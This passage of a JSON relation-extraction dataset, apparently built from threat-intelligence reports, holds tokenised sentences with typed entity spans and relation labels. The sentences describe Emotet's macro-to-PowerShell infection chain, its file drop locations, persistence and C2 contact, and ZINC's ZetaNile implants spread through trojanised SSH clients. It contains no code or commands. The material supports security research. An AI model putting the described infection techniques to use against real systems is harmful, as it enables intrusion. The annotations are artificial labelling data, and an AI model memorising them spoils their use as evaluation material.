"MF", "sent_id": 4, "global_pos": [94, 94], "name": "XLSM file", "pos": [3, 5], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "malspam campaign", "pos": [8, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "which", "pos": [14, 15], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "OLE2 macros", "pos": [16, 18], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [110, 110], "name": "WScript", "pos": [0, 1], "index": "19_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [115, 115], "name": "PowerShell", "pos": [5, 6], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [118, 118], "name": "macros", "pos": [8, 9], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [126, 126], "name": "Emotet DLL", "pos": [16, 18], "index": "22_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [130, 130], "name": "distribution servers", "pos": [20, 22], "index": "23_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [134, 134], "name": "PowerShell", "pos": [1, 2], "index": "24_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [152, 152], "name": "rundll32.exe", "pos": [1, 2], "index": "25_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [161, 161], "name": "C : \\ProgramData\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "26_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [171, 171], "name": "C : \\Windows\\SysWOW64 < RANDOM FILENAME >", "pos": [20, 27], "index": "27_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "h": 10, "t": 12}, {"r": "WR", "evidence": [3], "h": 10, "t": 13}, {"r": "RD", "evidence": [3], "t": 13, "h": 14}, {"r": "FR", "evidence": [3, 4, 5, 6], "h": 14, "t": 24}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 15}, {"r": "WR", "evidence": [4], "h": 17, "t": 18}, {"r": "RD", "evidence": [3, 4], "t": 13, "h": 16}, {"r": "CO", "evidence": [4, 5], "h": 18, "t": 21}, {"r": "FR", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 20, "t": 22}, {"r": "ST", "evidence": [5], "h": 20, "t": 23}, {"r": "RF", "evidence": [5], "h": 20, "t": 23}, {"r": "FR", "evidence": [5, 6, 7], "h": 20, "t": 25}, {"r": "RD", "evidence": [5, 6], "t": 22, "h": 24}, {"r": "EX", "evidence": [5, 6], "t": 22, "h": 24}, {"r": "RD", "evidence": [6, 7], "h": 24, "t": 26}, {"r": "RD", "evidence": [6, 7], "h": 24, "t": 26}, {"r": "WR", "evidence": [6, 7], "h": 24, "t": 26}, {"r": "EX", "evidence": [5, 6, 7], "t": 22, "h": 25}, {"r": "RD", "evidence": [7], "h": 25, "t": 27}, {"r": "RD", "evidence": [7], "h": 25, "t": 26}, {"r": "WR", "evidence": [7], "h": 25, "t": 27}]}, {"title": "038-1", "sents": [["As", "a", "result", ",", "we", "have", "seen", "new", "malicious", "email", "campaigns", "emerging", ",", "directly", "delivering", "Emotet", "to", "targeted", "victims", "."], ["Email", "thread", "hijacking", "is", "one", "popular", "technique", "employed", "in", "the", "delivery", "of", "these", "emails", ",", "which", "usually", "contain", "an", "attachment", "functioning", "as", "a", "downloader", "for", "obtaining", "the", "Emotet", "payload", "."], ["Emotet", "has", "been", "utilizing", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "in", "these", "spam", "campaigns", "."], ["One", "example", "of", "XLSM", "file", "involved", "in", "this", "malspam", "campaign", "has", "been", "identified", ",", "which", "contains", "OLE2", "macros", "."], ["WScript", "is", "utilized", "to", "invoke", "PowerShell", "once", "the", "macros", "are", "executed", ",", "which", "then", "retrieves", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "PowerShell", "invocation", "can", "be", "seen", "in", "the", "screenshot", "below", ",", "which", "is", "often", "obfuscated", "at", "runtime", "."], ["Once", "rundll32.exe", "executes", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\ProgramData\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64", "<", "RANDOM", "FILENAME", ">", ",", "''", "thereby", "infecting", "the", "system", "with", "Emotet", "."], ["Persistence", "is", "achieved", "by", "creating", "a", "Windows", "Service", "registration", "which", "executes", "the", "malware", "in", "the", "aftermath", "of", "system", "reboot", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "malicious email", "pos": [8, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "Emotet", "pos": [15, 16], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [18, 18], "name": "victims", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "Email thread hijacking", "pos": [0, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "emails", "pos": [13, 14], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "attachment", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "downloader", "pos": [23, 24], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "Emotet payload", "pos": [27, 29], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "Emotet", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "DOCM", "pos": [4, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "XLSM", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "password-protected ZIP archives", "pos": [9, 12], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "spam campaigns", "pos": [14, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [70, 70], "name": "XLSM file", "pos": [3, 5], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "malspam campaign", "pos": [8, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "which", "pos": [14, 15], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "OLE2 macros", "pos": [16, 18], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [86, 86], "name": "WScript", "pos": [0, 1], "index": "17_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [91, 91], "name": "PowerShell", "pos": [5, 6], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "macros", "pos": [8, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [102, 102], "name": "Emotet DLL", "pos": [16, 18], "index": "20_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [106, 106], "name": "distribution servers", "pos": [20, 22], "index": "21_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [110, 110], "name": "PowerShell", "pos": [1, 2], "index": "22_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [128, 128], "name": "rundll32.exe", "pos": [1, 2], "index": "23_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [137, 137], "name": "C : \\ProgramData\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "24_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [147, 147], "name": "C : \\Windows\\SysWOW64 < RANDOM FILENAME >", "pos": [20, 27], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [169, 169], "name": "Windows Service", "pos": [6, 8], "index": "26_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "WR", "evidence": [1], "h": 6, "t": 7}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 10}, {"r": "WR", "evidence": [2], "h": 8, "t": 11}, {"r": "RD", "evidence": [2], "t": 11, "h": 12}, {"r": "FR", "evidence": [2, 3, 4, 5], "h": 12, "t": 22}, {"r": "CO", "evidence": [2, 3], "h": 10, "t": 13}, {"r": "WR", "evidence": [3], "h": 15, "t": 16}, {"r": "RD", "evidence": [2, 3], "t": 11, "h": 14}, {"r": "CO", "evidence": [3, 4], "h": 16, "t": 19}, {"r": "FR", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [4], "h": 18, "t": 20}, {"r": "ST", "evidence": [4], "h": 18, "t": 21}, {"r": "RF", "evidence": [4], "h": 18, "t": 21}, {"r": "FR", "evidence": [4, 5, 6], "h": 18, "t": 23}, {"r": "RD", "evidence": [4, 5], "t": 20, "h": 22}, {"r": "EX", "evidence": [4, 5], "t": 20, "h": 22}, {"r": "RD", "evidence": [5, 6], "h": 22, "t": 24}, {"r": "RD", "evidence": [5, 6], "h": 22, "t": 24}, {"r": "WR", "evidence": [5, 6], "h": 22, "t": 24}, {"r": "EX", "evidence": [4, 5, 6], "t": 20, "h": 23}, {"r": "RD", "evidence": [6], "h": 23, "t": 25}, {"r": "RD", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 25}, {"r": "RD", "evidence": [6, 7], "t": 25, "h": 26}, {"r": "RD", "evidence": [6, 7], "t": 25, "h": 26}, {"r": "WR", "evidence": [6, 7], "t": 25, "h": 26}]}, {"title": "038-2", "sents": [["Email", "thread", "hijacking", "is", "one", "popular", "technique", "employed", "in", "the", "delivery", "of", "these", "emails", ",", "which", "usually", "contain", "an", "attachment", "functioning", "as", "a", "downloader", "for", "obtaining", "the", "Emotet", "payload", "."], ["Emotet", "has", "been", "utilizing", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "in", "these", "spam", "campaigns", "."], ["One", "example", "of", "XLSM", "file", "involved", "in", "this", "malspam", "campaign", "has", "been", "identified", ",", "which", "contains", "OLE2", "macros", "."], ["WScript", "is", "utilized", "to", "invoke", "PowerShell", "once", "the", "macros", "are", "executed", ",", "which", "then", "retrieves", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "PowerShell", "invocation", "can", "be", "seen", "in", "the", "screenshot", "below", ",", "which", "is", "often", "obfuscated", "at", "runtime", "."], ["Once", "rundll32.exe", "executes", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\ProgramData\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64", "<", "RANDOM", "FILENAME", ">", ",", "''", "thereby", "infecting", "the", "system", "with", "Emotet", "."], ["Persistence", "is", "achieved", "by", "creating", "a", "Windows", "Service", "registration", "which", "executes", "the", "malware", "in", "the", "aftermath", "of", "system", "reboot", "."], ["The", "infected", "system", "establishes", "a", "communication", "channel", "with", "the", "C2", "and", "begins", "receiving", "instructions", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Email thread hijacking", "pos": [0, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "emails", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "attachment", "pos": [19, 20], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [23, 23], "name": "downloader", "pos": [23, 24], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [27, 27], "name": "Emotet payload", "pos": [27, 29], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "Emotet", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "DOCM", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "XLSM", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "password-protected ZIP archives", "pos": [9, 12], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "spam campaigns", "pos": [14, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "XLSM file", "pos": [3, 5], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "malspam campaign", "pos": [8, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "which", "pos": [14, 15], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "OLE2 macros", "pos": [16, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "WScript", "pos": [0, 1], "index": "14_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [71, 71], "name": "PowerShell", "pos": [5, 6], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "macros", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "Emotet DLL", "pos": [16, 18], "index": "17_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [86, 86], "name": "distribution servers", "pos": [20, 22], "index": "18_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [90, 90], "name": "PowerShell", "pos": [1, 2], "index": "19_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [108, 108], "name": "rundll32.exe", "pos": [1, 2], "index": "20_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [117, 117], "name": "C : \\ProgramData\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "21_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [127, 127], "name": "C : \\Windows\\SysWOW64 < RANDOM FILENAME >", "pos": [20, 27], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [149, 149], "name": "Windows Service", "pos": [6, 8], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [164, 164], "name": "infected system", "pos": [1, 3], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [172, 172], "name": "C2", "pos": [9, 10], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "WR", "evidence": [0], "h": 3, "t": 4}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0, 1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1], "h": 5, "t": 8}, {"r": "RD", "evidence": [1], "t": 8, "h": 9}, {"r": "FR", "evidence": [1, 2, 3, 4], "h": 9, "t": 19}, {"r": "CO", "evidence": [1, 2], "h": 7, "t": 10}, {"r": "WR", "evidence": [2], "h": 12, "t": 13}, {"r": "RD", "evidence": [1, 2], "t": 8, "h": 11}, {"r": "CO", "evidence": [2, 3], "h": 13, "t": 16}, {"r": "FR", "evidence": [3], "h": 14, "t": 15}, {"r": "WR", "evidence": [3], "h": 15, "t": 17}, {"r": "ST", "evidence": [3], "h": 15, "t": 18}, {"r": "RF", "evidence": [3], "h": 15, "t": 18}, {"r": "FR", "evidence": [3, 4, 5], "h": 15, "t": 20}, {"r": "RD", "evidence": [3, 4], "t": 17, "h": 19}, {"r": "EX", "evidence": [3, 4], "t": 17, "h": 19}, {"r": "RD", "evidence": [4, 5], "h": 19, "t": 21}, {"r": "RD", "evidence": [4, 5], "h": 19, "t": 21}, {"r": "WR", "evidence": [4, 5], "h": 19, "t": 21}, {"r": "EX", "evidence": [3, 4, 5], "t": 17, "h": 20}, {"r": "RD", "evidence": [5], "h": 20, "t": 22}, {"r": "RD", "evidence": [5], "h": 20, "t": 21}, {"r": "WR", "evidence": [5], "h": 20, "t": 22}, {"r": "RD", "evidence": [5, 6], "t": 22, "h": 23}, {"r": "RD", "evidence": [5, 6], "t": 22, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 22, "h": 23}, {"r": "ST", "evidence": [6, 7], "h": 23, "t": 25}, {"r": "RF", "evidence": [6, 7], "h": 23, "t": 25}, {"r": "RD", "evidence": [5, 6, 7], "t": 22, "h": 24}, {"r": "ST", "evidence": [7], "h": 24, "t": 25}, {"r": "RF", "evidence": [7], "h": 24, "t": 25}]}, {"title": "038-3", "sents": [["Emotet", "has", "been", "utilizing", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "in", "these", "spam", "campaigns", "."], ["One", "example", "of", "XLSM", "file", "involved", "in", "this", "malspam", "campaign", "has", "been", "identified", ",", "which", "contains", "OLE2", "macros", "."], ["WScript", "is", "utilized", "to", "invoke", "PowerShell", "once", "the", "macros", "are", "executed", ",", "which", "then", "retrieves", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "PowerShell", "invocation", "can", "be", "seen", "in", "the", "screenshot", "below", ",", "which", "is", "often", "obfuscated", "at", "runtime", "."], ["Once", "rundll32.exe", "executes", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\ProgramData\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64", "<", "RANDOM", "FILENAME", ">", ",", "''", "thereby", "infecting", "the", "system", "with", "Emotet", "."], ["Persistence", "is", "achieved", "by", "creating", "a", "Windows", "Service", "registration", "which", "executes", "the", "malware", "in", "the", "aftermath", "of", "system", "reboot", "."], ["The", "infected", "system", "establishes", "a", "communication", "channel", "with", "the", "C2", "and", "begins", "receiving", "instructions", "."], ["This", "enables", "attackers", "to", "leverage", "these", "systems", "for", "additional", "spam", "distribution", ",", "thereby", "expanding", "the", "scope", "of", "their", "distribution", "campaigns", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Emotet", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "DOCM", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "XLSM", "pos": [6, 7], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "password-protected ZIP archives", "pos": [9, 12], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "spam campaigns", "pos": [14, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "XLSM file", "pos": [3, 5], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "malspam campaign", "pos": [8, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "which", "pos": [14, 15], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "OLE2 macros", "pos": [16, 18], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [36, 36], "name": "WScript", "pos": [0, 1], "index": "9_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [41, 41], "name": "PowerShell", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "macros", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "Emotet DLL", "pos": [16, 18], "index": "12_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [56, 56], "name": "distribution servers", "pos": [20, 22], "index": "13_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [60, 60], "name": "PowerShell", "pos": [1, 2], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [78, 78], "name": "rundll32.exe", "pos": [1, 2], "index": "15_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [87, 87], "name": "C : \\ProgramData\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "16_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [97, 97], "name": "C : \\Windows\\SysWOW64 < RANDOM FILENAME >", "pos": [20, 27], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "Windows Service", "pos": [6, 8], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [134, 134], "name": "infected system", "pos": [1, 3], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [142, 142], "name": "C2", "pos": [9, 10], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [154, 154], "name": "systems", "pos": [6, 7], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [157, 157], "name": "spam distribution", "pos": [9, 11], "index": "22_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "FR", "evidence": [0, 1, 2, 3], "h": 4, "t": 14}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "WR", "evidence": [1], "h": 7, "t": 8}, {"r": "RD", "evidence": [0, 1], "t": 3, "h": 6}, {"r": "CO", "evidence": [1, 2], "h": 8, "t": 11}, {"r": "FR", "evidence": [2], "h": 9, "t": 10}, {"r": "WR", "evidence": [2], "h": 10, "t": 12}, {"r": "ST", "evidence": [2], "h": 10, "t": 13}, {"r": "RF", "evidence": [2], "h": 10, "t": 13}, {"r": "FR", "evidence": [2, 3, 4], "h": 10, "t": 15}, {"r": "RD", "evidence": [2, 3], "t": 12, "h": 14}, {"r": "EX", "evidence": [2, 3], "t": 12, "h": 14}, {"r": "RD", "evidence": [3, 4], "h": 14, "t": 16}, {"r": "RD", "evidence": [3, 4], "h": 14, "t": 16}, {"r": "WR", "evidence": [3, 4], "h": 14, "t": 16}, {"r": "EX", "evidence": [2, 3, 4], "t": 12, "h": 15}, {"r": "RD", "evidence": [4], "h": 15, "t": 17}, {"r": "RD", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4], "h": 15, "t": 17}, {"r": "RD", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "RD", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "WR", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "ST", "evidence": [5, 6], "h": 18, "t": 20}, {"r": "RF", "evidence": [5, 6], "h": 18, "t": 20}, {"r": "RD", "evidence": [4, 5, 6], "t": 17, "h": 19}, {"r": "ST", "evidence": [6], "h": 19, "t": 20}, {"r": "RF", "evidence": [6], "h": 19, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 21}, {"r": "FR", "evidence": [7], "h": 21, "t": 22}]}, {"title": "052-0", "sents": [["The", "implant", "DLLs", "in", "the", "ZetaNile", "malware", "family", "are", "either", "packed", "with", "commercial", "software", "protectors", "such", "as", "Themida", "and", "VMProtect", "or", "are", "encrypted", "using", "custom", "algorithms", "."], ["The", "payload", "in", "the", "malicious", "DLL", "is", "decrypted", "using", "a", "custom", "key", ",", "passed", "as", "part", "of", "the", "DLL", "search", "order", "hijacking", "of", "the", "legitimate", "Windows", "process", ",", "as", "shown", "in", "Figure", "3", "."], ["The", "ZetaNile", "implants", "use", "unique", "custom", "encryption", "methods", "or", "AES", "encryption", "to", "generate", "command", "and", "control", "(", "C2", ")", "HTTP", "requests", "to", "known", "compromised", "C2", "domains", "."], ["By", "encoding", "the", "victim", "information", "in", "the", "parameters", "for", "common", "keywords", "like", "gametype", "or", "bbs", "in", "the", "HTTP", "POSTs", ",", "these", "C2", "communications", "can", "blend", "in", "with", "legitimate", "traffic", "."], ["Once", "they", "have", "established", "a", "connection", "with", "their", "target", ",", "ZINC", "operationalized", "malicious", "versions", "of", "two", "SSH", "clients", ",", "PuTTY", "and", "KiTTY", ",", "that", "acted", "as", "the", "entry", "vector", "for", "the", "ZetaNile", "implant", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["As", "part", "of", "the", "evolution", "of", "ZINC", "'", "s", "malware", "development", ",", "and", "in", "an", "effort", "to", "evade", "traditional", "defenses", ",", "running", "the", "included", "executable", "does", "not", "drop", "the", "ZetaNile", "implant", "."], ["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "implant DLLs", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "Themida", "pos": [17, 18], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "VMProtect", "pos": [19, 20], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [24, 24], "name": "custom algorithms", "pos": [24, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "payload", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "DLL", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "custom key", "pos": [10, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "DLL", "pos": [18, 19], "index": "7_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [52, 52], "name": "Windows process", "pos": [25, 27], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "ZetaNile implants", "pos": [1, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "custom encryption", "pos": [5, 7], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "AES encryption", "pos": [9, 11], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [85, 85], "name": "C2 domains", "pos": [24, 26], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "victim information", "pos": [3, 5], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [119, 119], "name": "they", "pos": [1, 2], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [126, 126], "name": "target", "pos": [8, 9], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "ZINC", "pos": [10, 11], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [134, 134], "name": "SSH clients", "pos": [16, 18], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [137, 137], "name": "PuTTY", "pos": [19, 20], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [139, 139], "name": "KiTTY", "pos": [21, 22], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [149, 149], "name": "ZetaNile implant", "pos": [31, 33], "index": "20_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [157, 157], "name": "recipient", "pos": [5, 6], "index": "21_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [161, 161], "name": "ReadMe.txt", "pos": [9, 10], "index": "22_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [164, 164], "name": "executable file", "pos": [12, 14], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [175, 175], "name": "ZINC", "pos": [6, 7], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [193, 193], "name": "executable", "pos": [24, 25], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [198, 198], "name": "ZetaNile implant", "pos": [29, 31], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [202, 202], "name": "ZetaNile", "pos": [1, 2], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [208, 208], "name": "SSH utility", "pos": [7, 9], "index": "28_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [216, 216], "name": "ReadMe.txt file", "pos": [15, 17], "index": "29_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "WR", "evidence": [0], "t": 0, "h": 3}, {"r": "WR", "evidence": [1], "t": 4, "h": 6}, {"r": "RD", "evidence": [1], "t": 7, "h": 8}, {"r": "CO", "evidence": [1], "h": 5, "t": 7}, {"r": "IJ", "evidence": [2], "t": 9, "h": 10}, {"r": "IJ", "evidence": [2], "t": 9, "h": 11}, {"r": "ST", "evidence": [2], "h": 9, "t": 12}, {"r": "RF", "evidence": [2], "h": 9, "t": 12}, {"r": "WR", "evidence": [2, 3], "h": 11, "t": 13}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 20}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 9, "t": 27}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "ST", 